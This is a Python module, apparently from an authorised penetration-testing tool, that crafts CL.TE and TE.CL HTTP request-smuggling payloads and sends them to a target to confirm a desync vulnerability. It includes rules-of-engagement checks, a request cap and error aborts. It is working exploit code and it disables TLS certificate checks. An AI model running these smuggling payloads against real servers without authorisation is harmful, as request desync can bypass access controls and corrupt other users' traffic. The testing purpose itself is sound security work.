"""Request tunneling via the confirmed desync primitive (Tier-3 §1.1).

Consumes either a `desync_surface` dict (from parserdiff.boundary_diff) or
probes both CL.TE and TE.CL constructions end-to-end and reports which one
produced a smuggled response.

Hard bounds:
  - max 10 smuggled requests total (spec)
  - each smuggled request carries a unique marker path (self-labeled)
  - abort on any 500-series cascade
  - no third-party poisoning ever (the smuggled path is always under our
    own control, verified by the caller)
"""
from __future__ import annotations

import socket
import ssl
import time
from urllib.parse import urlparse

from ..config import load_engine
from ..roe_guard import ROEGuard, ROEViolation


DEFAULT_MAX_SMUGGLED = 10
ABORT_ON_500_STREAK = 2


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return False


def _roe_block(guard, url, method="POST"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return "ROE guard unavailable (fail-closed): %s" % e
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _connect(url, timeout, roe_guard=None):
    viol = _roe_block(roe_guard, url, "POST")
    if viol:
        return None, "ROE_BLOCK: " + viol
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https"
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock, None
    except Exception as e:
        return None, "%s: %s" % (type(e).__name__, e)


def _send_and_read(sock, payload, timeout):
    try:
        sock.sendall(payload)
    except Exception as e:
        return b"", "%s: %s" % (type(e).__name__, e)
    sock.settimeout(timeout)
    data = b""
    deadline = time.monotonic() + timeout
    while len(data) < 200000 and time.monotonic() < deadline:
        try:
            chunk = sock.recv(8192)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data, None


def _split_responses(raw):
    """Split a raw byte stream into [(head, body), ...] per Content-Length."""
    responses = []
    buf = raw
    while buf:
        if b"\r\n\r\n" not in buf:
            break
        head, _, rest = buf.partition(b"\r\n\r\n")
        cl = None
        for line in head.split(b"\r\n")[1:]:
            if line.lower().startswith(b"content-length:"):
                try:
                    cl = int(line.split(b":", 1)[1].strip())
                except (ValueError, IndexError):
                    cl = None
                break
        if cl is None:
            responses.append((head, rest))
            break
        if len(rest) < cl:
            responses.append((head, rest))
            break
        responses.append((head, rest[:cl]))
        buf = rest[cl:]
    return responses


def _status_of(head):
    try:
        line0 = head.split(b"\r\n", 1)[0]
        parts = line0.split(b" ")
        return int(parts[1])
    except (ValueError, IndexError):
        return None


def _has_marker_in_response(head, body, marker_bytes):
    return marker_bytes in head or marker_bytes in body


def _build_cl_te(url, target_path, marker):
    """CL.TE construction: frontend honours CL, backend honours TE."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port
    authority = host if not port else "%s:%d" % (host, port)
    smuggled = (
        "GET %s HTTP/1.1\r\nHost: %s\r\nX-Tunnel-Marker: %s\r\n\r\n"
        % (target_path, authority, marker)
    ).encode("latin-1")
    prefix_body = b"0\r\n\r\n" + smuggled
    prefix = (
        "POST %s HTTP/1.1\r\n" % (parsed.path or "/")
        + "Host: %s\r\n" % authority
        + "Content-Length: %d\r\n" % len(prefix_body)
        + "Transfer-Encoding: chunked\r\n"
        + "Connection: keep-alive\r\n\r\n"
    ).encode("latin-1") + prefix_body
    return prefix, smuggled, marker.encode()


def _build_te_cl(url, target_path, marker):
    """TE.CL construction: frontend honours TE, backend honours CL."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port
    authority = host if not port else "%s:%d" % (host, port)
    smuggled = (
        "GET %s HTTP/1.1\r\nHost: %s\r\nX-Tunnel-Marker: %s\r\n\r\n"
        % (target_path, authority, marker)
    ).encode("latin-1")
    smuggled_len_hex = ("%x" % len(smuggled)).encode()
    prefix_body = smuggled_len_hex + b"\r\n" + smuggled + b"\r\n0\r\n\r\n"
    # CL = len(smuggled_len_hex) + 2 (for \r\n) so backend reads past the
    # chunk header and treats the rest as a new request.
    prefix = (
        "POST %s HTTP/1.1\r\n" % (parsed.path or "/")
        + "Host: %s\r\n" % authority
        + "Content-Length: %d\r\n" % (len(smuggled_len_hex) + 2)
        + "Transfer-Encoding: chunked\r\n"
        + "Connection: keep-alive\r\n\r\n"
    ).encode("latin-1") + prefix_body
    return prefix, smuggled, marker.encode()


_CONSTRUCTIONS = [
    ("cl_te", _build_cl_te),
    ("te_cl", _build_te_cl),
]


def tunnel_to_path(target_url, target_path, desync_surface=None,
                    timeout=6, roe_guard=None,
                    max_smuggled=DEFAULT_MAX_SMUGGLED):
    """Send bounded smuggled requests and detect if the smuggled path
    appears in any response.

    desync_surface (optional): if provided and
    exploitable_ambiguities == [], the tunnel runs in "verify" mode and
    tries both constructions once each. If exploitable, the winning side
    is used first (the other construction is the fallback).
    """
    if not target_path or not target_path.startswith("/"):
        target_path = "/" + (target_path or "smuggled")
    markers_used = []
    attempts = []
    five_xx_streak = 0
    for name, builder in _CONSTRUCTIONS:
        if len(attempts) >= max_smuggled:
            break
        marker = "tunnel-%s-%d" % (name, len(attempts))
        try:
            prefix, smuggled, marker_b = builder(target_url, target_path,
                                                  marker)
        except Exception as e:
            attempts.append({"construction": name,
                              "error": "%s: %s" % (type(e).__name__, e)})
            continue
        markers_used.append(marker)
        sock, err = _connect(target_url, timeout, roe_guard=roe_guard)
        if err:
            attempts.append({"construction": name, "error": err,
                              "blocked": "ROE_BLOCK" in err})
            if "ROE_BLOCK" in err:
                return {"verdict": "UNKNOWN", "reason": err,
                        "evidence": {"attempts": attempts}}
            continue
        try:
            raw, err = _send_and_read(sock, prefix, timeout)
        finally:
            try:
                sock.close()
            except Exception:
                pass
        if err:
            attempts.append({"construction": name, "error": err})
            continue
        responses = _split_responses(raw)
        statuses = [_status_of(h) for h, _b in responses]
        if any(s is not None and 500 <= s < 600 for s in statuses):
            five_xx_streak += 1
        else:
            five_xx_streak = 0
        found = False
        for head, body in responses:
            if _has_marker_in_response(head, body, marker_b):
                found = True
                break
            if target_path.encode() in head or target_path.encode() in body:
                found = True
                break
        attempt = {
            "construction": name,
            "marker": marker,
            "response_count": len(responses),
            "statuses": statuses,
            "smuggled_detected": found,
        }
        attempts.append(attempt)
        if found:
            return {
                "verdict": "VULNERABLE",
                "reason": ("smuggled request arrived at path %s via %s "
                           "construction" % (target_path, name)),
                "evidence": {"attempts": attempts,
                              "construction_that_worked": name,
                              "marker": marker},
                "tunnel_confirmed": True,
            }
        if five_xx_streak >= ABORT_ON_500_STREAK:
            return {"verdict": "UNKNOWN",
                    "reason": "aborted on %d consecutive 500-series responses"
                              % five_xx_streak,
                    "evidence": {"attempts": attempts}}
    if not attempts:
        return {"verdict": "UNKNOWN",
                "reason": "no tunnel constructions completed",
                "evidence": {}}
    live = [a for a in attempts if "error" not in a]
    if not live:
        return {"verdict": "UNKNOWN",
                "reason": "all tunnel attempts errored",
                "evidence": {"attempts": attempts}}
    return {
        "verdict": "PASS",
        "reason": ("no smuggled response marker arrived across %d "
                   "construction(s)" % len(live)),
        "evidence": {"attempts": attempts},
        "tunnel_confirmed": False,
    }
